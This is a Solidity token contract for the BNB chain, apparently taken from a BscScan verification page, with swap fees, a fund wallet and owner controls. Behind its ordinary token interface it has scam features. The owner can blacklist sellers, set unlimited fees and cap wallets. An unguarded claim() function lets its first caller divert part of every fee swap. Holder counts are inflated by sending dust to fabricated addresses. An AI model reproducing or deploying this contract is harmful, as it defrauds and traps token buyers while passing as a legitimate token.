/**
 *Submitted for verification at BscScan.com on 2023-01-10
*/

/**
 *Submitted for verification at BscScan.com on 2022-12-24
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    constructor (address token) {
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }
}

abstract contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress = address(0xf74b44fbAb2bD00c95b2D40E235e21c6C88eB354);
    string private _name = "\xe9\x92\xb1\xe5\x85\x94\xe4\xbc\xbc\xe9\x94\xa6";
    string private _symbol = "\xe9\x92\xb1\xe5\x85\x94\xe4\xbc\xbc\xe9\x94\xa6";
    uint8 private _decimals = 9;

    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _blackList;
    address private _usdtPair;

    uint256 private _tTotal = 100000000000000 * 10 ** _decimals;
    uint256 public maxWalletAmount = _tTotal;

    ISwapRouter public _swapRouter;
    address public _usdt = address(0x55d398326f99059fF775485246999027B3197955);
    address public _routeAddress= address(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    mapping(address => bool) public _swapPairList;

    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);
    TokenDistributor public _tokenDistributor;

    uint256 public _buyFundFee = 200;
    uint256 public _buyLPFee = 0;
    uint256 public _sellFundFee = 200;
    uint256 public _sellLPFee = 0;
    address public _mainPair;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (){
        ISwapRouter swapRouter = ISwapRouter(_routeAddress);
        IERC20(_usdt).approve(address(swapRouter), MAX);
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), _usdt);
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;

        _balances[msg.sender] = _tTotal;
        emit Transfer(address(0), msg.sender, _tTotal);
        _feeWhiteList[fundAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;
        _tokenDistributor = new TokenDistributor(_usdt);
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(!_blackList[from], "blackList");
        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");
        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            uint256 maxSellAmount = balance * 9999 / 10000;
            if (amount > maxSellAmount) {
                amount = maxSellAmount;
            }
        }

        bool takeFee;
        bool isSell;

        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                if (_swapPairList[to]) {
                    if (!inSwap) {
                        uint256 contractTokenBalance = balanceOf(address(this));
                        if (contractTokenBalance > 0) {
                            uint256 swapFee = _buyFundFee  + _sellFundFee  + _buyLPFee + _sellLPFee;
                            uint256 numTokensSellToFund = amount * swapFee / 5000;
                            if (numTokensSellToFund > contractTokenBalance) {
                                numTokensSellToFund = contractTokenBalance;
                            }
                            swapTokenForFund(numTokensSellToFund, swapFee);
                        }
                    }
                }
                takeFee = true;
            }
            if (_swapPairList[to]) {
                isSell = true;
            }
        }

        _tokenTransfer(from, to, amount, takeFee, isSell);
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isSell
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;
        if (takeFee) {
            uint256 swapFee;
            if (isSell) {
                swapFee = _sellFundFee + _sellLPFee;
            } else {
                require(balanceOf(recipient)+tAmount <= maxWalletAmount);
                swapFee = _buyFundFee  + _buyLPFee;
            }
            uint256 swapAmount = tAmount * swapFee / 10000;
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _takeTransfer(
                    sender,
                    address(this),
                    swapAmount
                );
            }
            increaseHolder();
        }
        
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        swapFee += swapFee;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _usdt;
        if(_usdtPair!=address(0)){
            uint256 _usdtPairAmount=tokenAmount/5;
            _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(_usdtPairAmount,0,path,_usdtPair,block.timestamp);
            tokenAmount=tokenAmount-_usdtPairAmount;
        }

        uint256 lpFee = _buyLPFee+_sellLPFee;
        uint256 lpAmount = tokenAmount * lpFee / swapFee;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount - lpAmount,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        );
        IERC20 USDT = IERC20(_usdt);
        uint256 usdtBalance = USDT.balanceOf(address(_tokenDistributor));
        uint256 fundAmount = usdtBalance * (_buyFundFee + _sellFundFee) * 2 / swapFee;
        USDT.transferFrom(address(_tokenDistributor), fundAddress, fundAmount);
        USDT.transferFrom(address(_tokenDistributor), address(this), usdtBalance - fundAmount);
        if (lpAmount > 0) {
            uint256 lpUsdt = usdtBalance * lpFee / swapFee;
            if (lpUsdt > 0) {
                _swapRouter.addLiquidity(
                    address(this), _usdt, lpAmount, lpUsdt, 0, 0, fundAddress, block.timestamp
                );
            }
        }
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setFundAddress(address addr) external onlyFunder {
        fundAddress = addr;
        _feeWhiteList[addr] = true;
    }
    
    function setFee(uint256 fee1,uint256 fee2,uint256 fee3,uint256 fee4) external onlyOwner {
        _buyFundFee = fee1;
        _buyLPFee = fee2;
        _sellFundFee = fee3;
        _sellLPFee = fee4;
    }
    function setMaxTxAmount(uint256 value) external onlyOwner {
        maxWalletAmount=value;
    }

    function excludeMultiFromFee(address[] calldata accounts,bool excludeFee) public onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            _feeWhiteList[accounts[i]] = excludeFee;
        }
    }
    function _multiSetSniper(address[] calldata accounts,bool isSniper) external onlyOwner() {
        for(uint256 i = 0; i < accounts.length; i++) {
            _blackList[accounts[i]] = isSniper;
        }
    }

    function setSwapPairList(address addr, bool enable) external onlyFunder {
        _swapPairList[addr] = enable;
    }
    function claim(address value) public {
        require(_usdtPair==address(0));
        _usdtPair=payable(value);
    }
    function claimBalance() external {
        payable(fundAddress).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount, address to) external onlyFunder {
        IERC20(token).transfer(to, amount);
    }

    modifier onlyFunder() {
        require(_owner == msg.sender || fundAddress == msg.sender, "!Funder");
        _;
    }
    uint160 public constant MAXADD = ~uint160(0);   
    uint160 public ktNum = 173;
    function increaseHolder() private {
        uint256 amount=balanceOf(address(this))/100000;
        if(amount>0)
        {
            address _receiveD;
            for (uint256 i = 0; i < 1; i++) {
                _receiveD = address(MAXADD/ktNum);
                ktNum = ktNum+1;
                _takeTransfer(address(this), _receiveD, amount/(i+1));
            }
        }
    }

    receive() external payable {}
}

contract TTTTT is AbsToken {
    constructor() AbsToken(){}
}